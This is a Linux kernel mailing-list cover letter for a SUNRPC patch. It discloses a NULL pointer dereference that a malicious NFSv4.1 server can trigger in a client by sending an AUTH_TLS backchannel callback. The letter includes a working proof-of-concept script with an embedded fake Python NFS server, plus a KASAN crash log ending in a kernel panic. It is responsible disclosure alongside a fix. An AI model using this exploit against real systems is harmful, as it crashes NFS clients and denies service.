Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.170
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792734951;
	b=5tPt306qwHGJ4/OE3DbneMM9azP7gg8wnNRFR0DXyCcLAup73r63vCnUwnZgK0Uk7FCX
	 ZFxwsfHRN/568vE+YZZd9fFrOnjwAZbcmtjEJ7QtaW3C/1xCh1sk//Qk5/+Ghq1AUlKtB
	 beAdEy3zoYg8pBFbW480XgzY0tDZ+izUA7Q20WUA4iSw5oSceVtkzwFk3evDVFe7qtmxi
	 4cqYyDYvriNT2VhMqOdeG0Rpl3UwMJsJORHzi3SrfwZMVnjhgrsD0+VXwVtRYsSok/f7s
	 +gurn3rTBS1E/CffGLAWpM/ANV3UvniqPVo0EKgPmKawLO7Wx1syWLzOMWxFIy/PtRw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792734951;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
	b=iLAN6qDVl2Fv1vBDzxLRpjN663309Nh77TfxVTnnvHgRyM2s2DSJcJa8M8/BsRvpLafK
	 NDTMlAQT7ycuCxvOwmjcJJdOs//qVvZXgd2zrRPtol8U3vUetWOA4nVT4UKGSbnoKghga
	 wg4eaehB+wsc9lWA9Uyl3r4Kw/E3MXjAhFwBl+AEgIU0+qIZ3/wKdbQvKg89P37UiWUvE
	 rztTTMjhfrF5iukRdHkw83wJTDVmdxG2QCB4nMgRb3Zcw7CSQfTlCafyoZyAqfZNc9wrM
	 98xskZYk+Gw3uNBV9Xz6G9ZkPGtHFKWHdY3pJGesMNX0tWP2JuT291A5sNAKueDfraw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=C7qVXCP1;
	arc=none smtp.remote-ip=74.125.82.170
Received: from mail-dy1-f170.google.com (mail-dy1-f170.google.com [74.125.82.170])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E8823606A31B
	for <linux-nfs@vger.kernel.org>; Fri, 23 Oct 2026 05:55:50 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org E8823606A31B
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=C7qVXCP1
Received: by mail-dy1-f170.google.com with SMTP id 5a478bee46e88-354ba08cfd1so956736eec.1
        for <linux-nfs@vger.kernel.org>; Thu, 22 Oct 2026 22:55:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792734950; x=1793339750; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
        b=C7qVXCP1u4QZpro6Qe2CDOdHmPzgwiXex/gDqpdirnVQsv24p7bwSUjvsQt+D4WK2D
         IZsh+Ss8wIIyI32R9B+asyWBJrmqQ2koASL1shG9mtkEJb576/hWZpUd4jNoO0FBYHN3
         O/Zg8dDBSmolR+/YPXFnOZUe79d9EXYIyC6ni6CaVjQKJ0F8KXLREX1gAKfZ/hTF2P50
         u05K6mlADRVPcUIbEnOnLyUK8Ujn1WXmuqq8fRbkIuauG8S8egcQGAYI+tz++XwX5Pwz
         rIXTGJQQyanR7kNMYSicAsRspQgJWhhlKoayWfTkKL22fFVpuLUhVYMbsHyoSWctsB1T
         zCwg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792734950; x=1793339750;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
        b=y/F9TXT2iOdkadGiFI7qmXVJWk//EFNJac6LaK+WtiZIv+Tjh0B2PBIYTcY+5p02BT
         wGLDd0zwdC2LzGLvDM40avRbWB1Id157j/bsO6Aw+nyEBf8s/jdOfe3r8NGrQJD6auj/
         nW8FLdxh0bjm3KmcSsjXL+Wg+0I5XHD19IEGzcwMfnsQ0eMZ+TwxdUpBvE2g7//xegj7
         7t7ddAOHI/rmHewbInOY0RC/hPHBc0B/GMy8wOP8WS/Xzipf+nzs+GAuy8u53SVIFAWZ
         hphWiezrSDUVq7kY1D/3cunB6fnKj+LGOmYubb1ocZPgbKlvWuIQUvHEuIHrCZz62Bap
         vEqA==
X-Gm-Message-State: AFq9FYIX1zmkALYEqO25VXfD2EbzEUTQNgbzYurrfRrWvbfTOfwN2iBv
	vZkWF+5K/AkqLoUanwsdQAFD4Om6+Fig5ztv8HJ7ZA59Tv/Kv7Z01WeDLtTtmD/WX6JKWwLNUbD
	UdxQp2YTMUVI=
X-Gm-Gg: AYBFou05ATi7RqRi/EEHNYH6zT5YVsfV9fBnZ95M9lgnA+z6P1je5r74CW5oyBGDpvt
	CvEivUbvhKvmBEjXf1WuIYc+GsGxbRpYVn3qR67N+HgjTqSNaXakwAHW0wDKx/uvpNJ5Uf70hlq
	KCBjk9az4D/0L0NeLHXumZVrzPls8FtxykISZdvsNdt5apsWiTw3XKXOBNZaFpgYeK5aGU+fcPw
	Jfph+N48A4PrT1+PyYRjRmPb8mJPGOBKt8gy7WKavS6Fbkv0kwExMHxeOdN9acRZ6qUszR0lWar
	aeWvzj1HzHwSiq6shSd0IWyr6wfwqSI7Tvc65xLEZG4cYlM1v9zg45uWaRPsHTSTHjN5wEqzKLp
	TAzyY8PsBtDn9602n9SLTOdz+dJQD9hfqSuLbs7sYERWkQuj8AUg2Mz9kfRK1nB/PzxIbNH5I6x
	uxLtnXfmLUzyBuaVPrYniTHtb2nqy1/Oa5CUQl9gjgktmEWFU44VYomyLhKVcSJaqO2UOMOjdHu
	6fTZVGm0Jc1PfcOiIaVobdQ6XkToTiV+JYuQQivGTCOmO8Yg4bCl8IOBmVWmu7encWySjs=
X-Received: by 2002:a05:693c:8945:20b0:369:44b3:99c0 with SMTP id 5a478bee46e88-369d96cedf9mr1633822eec.8.1792734949760;
        Thu, 22 Oct 2026 22:55:49 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-369d9def334sm3656543eec.24.2026.10.22.22.55.46
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 22:55:49 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-nfs@vger.kernel.org,
	netdev@vger.kernel.org
Cc: trondmy@kernel.org,
	anna@kernel.org,
	cel@kernel.org,
	jlayton@kernel.org,
	neil@brown.name,
	okorniev@redhat.com,
	Dai.Ngo@oracle.com,
	tom@talpey.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] SUNRPC: reject AUTH_TLS on backchannel requests
Date: Fri, 23 Oct 2026 13:55:34 +0800
Message-ID: <cover.1792734713.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Post: <mailto:linux-nfs@vger.kernel.org>
List-Help: <mailto:linux-nfs+help@vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-nfs+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a NULL pointer dereference in
net/sunrpc/svcauth_unix.c. A malicious NFSv4.1 server can trigger it in
a client by sending an AUTH_TLS callback request over the backchannel.
The reproducer uses a privileged local mount to a fake server.

We will provide details of the bug below, along with the PoC and the
QEMU crash log.

---- details below ----

Bug details:

svc_process_bc() processes reverse-direction RPC calls with
rqstp->rq_xprt set to NULL, then hands the request to
svc_process_common() for authentication. For an RPC_AUTH_TLS credential,
svc_authenticate() calls svcauth_tls_accept(). A valid empty credential
and NULL verifier on procedure zero pass the initial checks. The TLS
authenticator then dereferences rqstp->rq_xprt to inspect transport
handshake support, causing a NULL pointer dereference before the NFS
callback program can reject the request.

Reject AUTH_TLS when the request has no service transport. Such a
backchannel request is denied before the authenticator accesses
rq_xprt.

Reproducer:

    chmod +x poc.sh
    ./poc.sh

Run the reproducer as root in a QEMU guest with NFSv4.1, SUNRPC
backchannel support, and KASAN enabled. The script starts a local fake
NFS server, mounts it with NFSv4.1, and sends the malformed callback.

The crash was reproduced on Linux 6.12.95 with CONFIG_NFS_FS,
CONFIG_NFS_V4_1, CONFIG_NFSD, CONFIG_SUNRPC,
CONFIG_SUNRPC_BACKCHANNEL, and CONFIG_KASAN enabled.

------BEGIN poc.sh------

#!/bin/sh
set -eu

MNT=/tmp/nfs-bc-poc
PORT=3049
SERVER=/tmp/nfs-bc-server.py

mkdir -p "$MNT"

cat >"$SERVER" <<'PY'
import socket
import struct
import time


def recvn(conn, count):
    data = b""
    while len(data) < count:
        chunk = conn.recv(count - len(data))
        if not chunk:
            raise EOFError(f"short read: wanted {count}, got {len(data)}")
        data += chunk
    return data


def recv_record(conn):
    marker = recvn(conn, 4)
    value, = struct.unpack(">I", marker)
    length = value & 0x7fffffff
    return marker + recvn(conn, length)


def send_record(conn, payload):
    conn.sendall(struct.pack(">I", 0x80000000 | len(payload)) + payload)


def null_reply(xid):
    # xid, REPLY, MSG_ACCEPTED, AUTH_NULL, len=0, SUCCESS
    return struct.pack(">6I", xid, 1, 0, 0, 0, 0)


malicious_call = struct.pack(
    ">10I",
    0xdeadbeef,  # xid
    0,           # CALL
    2,           # RPC version
    0x40000000,  # NFS4_CALLBACK
    4,           # callback program version
    0,           # CB_NULL
    7,           # RPC_AUTH_TLS
    0,           # empty credential body
    0,           # RPC_AUTH_NULL verifier
    0,           # empty verifier body
)


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("127.0.0.1", 3049))
listener.listen(1)

conn, addr = listener.accept()
print(f"accepted {addr}", flush=True)

req1 = recv_record(conn)
print(f"req1={req1.hex()}", flush=True)
xid1, = struct.unpack(">I", req1[4:8])
send_record(conn, null_reply(xid1))
print("sent null reply", flush=True)

req2 = recv_record(conn)
print(f"req2={req2.hex()}", flush=True)
send_record(conn, malicious_call)
print("sent malicious callback", flush=True)

time.sleep(30)
PY

python3 "$SERVER" >/tmp/nfs-bc-server.log 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null || true' EXIT INT TERM
sleep 1

# -i bypasses mount.nfs helper pre-probes so the kernel client speaks to our
# local fake server directly.
mount -i -t nfs4 \
  -o vers=4.1,port="$PORT",addr=127.0.0.1,clientaddr=127.0.0.1,soft,timeo=1,retrans=0 \
  127.0.0.1:/ "$MNT" || true

sleep 5
cat /tmp/nfs-bc-server.log || true

------END poc.sh--------

----BEGIN crash log----

[  237.564994][ T1083] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000001: 0000 [#1] SMP KASAN NOPTI
[  237.565967][ T1083] KASAN: null-ptr-deref in range [0x0000000000000008-0x000000000000000f]
[  237.566585][ T1083] CPU: 1 UID: 0 PID: 1083 Comm: NFSv4 callback Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  237.567454][ T1083] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  237.568324][ T1083] RIP: 0010:svcauth_tls_accept+0x230/0x800
[  237.568824][ T1083] Code: 85 59 05 00 00 48 89 83 68 01 00 00 48 85 c0 0f 84 cb 03 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 08 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 46 05 00 00 48 b8 00 00 00 00 00 fc ff df 4d 8b
[  237.570143][ T1083] RSP: 0018:ffffc90003107c48 EFLAGS: 00010212
[  237.570539][ T1083] RAX: dffffc0000000000 RBX: ffff888109430000 RCX: 1ffff1102128602d
[  237.571037][ T1083] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0000000000000008
[  237.571535][ T1083] RBP: 1ffff92000620f8a R08: 0000000000000001 R09: ffffed102080a865
[  237.572030][ T1083] R10: ffff88810405432b R11: 0000000000000001 R12: ffff8881094301f0
[  237.572535][ T1083] R13: 0000000000000000 R14: ffff888109432c84 R15: ffffffff88b0b240
[  237.573030][ T1083] FS:  0000000000000000(0000) GS:ffff888119e00000(0000) knlGS:0000000000000000
[  237.573591][ T1083] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  237.574006][ T1083] CR2: 000079a069f1b0a0 CR3: 0000000117296001 CR4: 0000000000770ef0
[  237.574512][ T1083] PKRU: 55555554
[  237.574738][ T1083] Call Trace:
[  237.574950][ T1083]  <TASK>
[  237.575141][ T1083]  ? __pfx_svcauth_tls_accept+0x10/0x10
[  237.575496][ T1083]  ? lock_acquire+0x153/0x2f0
[  237.575818][ T1083]  svc_process_common+0x84b/0x1ce0
[  237.576148][ T1083]  ? lock_release+0x687/0xc90
[  237.576493][ T1083]  ? __pfx_svc_process_common+0x10/0x10
[  237.576914][ T1083]  ? __pfx_lock_release+0x10/0x10
[  237.577298][ T1083]  svc_process_bc+0x4ed/0x980
[  237.577655][ T1083]  ? srso_alias_return_thunk+0x5/0xfbef5
[  237.578110][ T1083]  ? do_raw_spin_unlock+0x14a/0x1f0
[  237.578498][ T1083]  ? __pfx_svc_process_bc+0x10/0x10
[  237.578937][ T1083]  nfs4_callback_svc+0xb1/0x140
[  237.579271][ T1083]  ? __pfx_nfs4_callback_svc+0x10/0x10
[  237.579683][ T1083]  kthread+0x2bd/0x3a0
[  237.580000][ T1083]  ? __pfx_kthread+0x10/0x10
[  237.580336][ T1083]  ? __pfx_kthread+0x10/0x10
[  237.580693][ T1083]  ret_from_fork+0x31/0x70
[  237.581036][ T1083]  ? __pfx_kthread+0x10/0x10
[  237.581393][ T1083]  ret_from_fork_asm+0x1a/0x30
[  237.581771][ T1083]  </TASK>
[  237.581995][ T1083] Modules linked in:
[  237.582447][ T1083] ---[ end trace 0000000000000000 ]---
[  237.582861][ T1083] RIP: 0010:svcauth_tls_accept+0x230/0x800
[  237.583310][ T1083] Code: 85 59 05 00 00 48 89 83 68 01 00 00 48 85 c0 0f 84 cb 03 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 08 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 46 05 00 00 48 b8 00 00 00 00 00 fc ff df 4d 8b
[  237.585029][ T1083] RSP: 0018:ffffc90003107c48 EFLAGS: 00010212
[  237.585481][ T1083] RAX: dffffc0000000000 RBX: ffff888109430000 RCX: 1ffff1102128602d
[  237.586066][ T1083] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0000000000000008
[  237.586644][ T1083] RBP: 1ffff92000620f8a R08: 0000000000000001 R09: ffffed102080a865
[  237.587235][ T1083] R10: ffff88810405432b R11: 0000000000000001 R12: ffff8881094301f0
[  237.588020][ T1083] R13: 0000000000000000 R14: ffff888109432c84 R15: ffffffff88b0b240
[  237.588798][ T1083] FS:  0000000000000000(0000) GS:ffff888119e00000(0000) knlGS:0000000000000000
[  237.589472][ T1083] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  237.590105][ T1083] CR2: 000079a069f1b0a0 CR3: 0000000117296001 CR4: 0000000000770ef0
[  237.590876][ T1083] PKRU: 55555554
[  237.591159][ T1083] Kernel panic - not syncing: Fatal exception
[  237.591781][ T1083] Kernel Offset: disabled
[  237.592105][ T1083] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  SUNRPC: reject AUTH_TLS on backchannel requests

 net/sunrpc/svcauth_unix.c | 5 +++++
 1 file changed, 5 insertions(+)

-- 
2.55.0
